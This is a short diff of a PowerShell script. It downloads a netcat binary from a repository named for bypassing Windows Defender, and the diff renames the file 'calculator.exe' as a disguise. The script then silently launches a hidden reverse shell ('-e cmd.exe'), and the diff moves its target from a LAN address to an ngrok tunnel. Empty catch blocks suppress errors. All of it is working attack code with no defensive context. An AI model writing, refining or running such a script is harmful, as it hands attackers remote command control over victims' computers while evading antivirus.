@@ -12,12 +12,12 @@ try {
 } catch {}
 
 try {
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KaiKim2/WindowsDefenderBypassNetcat/main/nc.exe" -OutFile $NcPath
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KaiKim2/WindowsDefenderBypassNetcat/main/calculator.exe" -OutFile $NcPath
 } catch {}
 
 try {
     $WshShell = New-Object -ComObject WScript.Shell
-    $WshShell.Run("`"$NcPath`" 192.168.0.115 4444 -e cmd.exe", 0, $false)
+    $WshShell.Run("`"$NcPath`" 0.tcp.in.ngrok.io 13103 -e cmd.exe", 0, $false)
 } catch {}
 
 Start-Sleep -Seconds 5
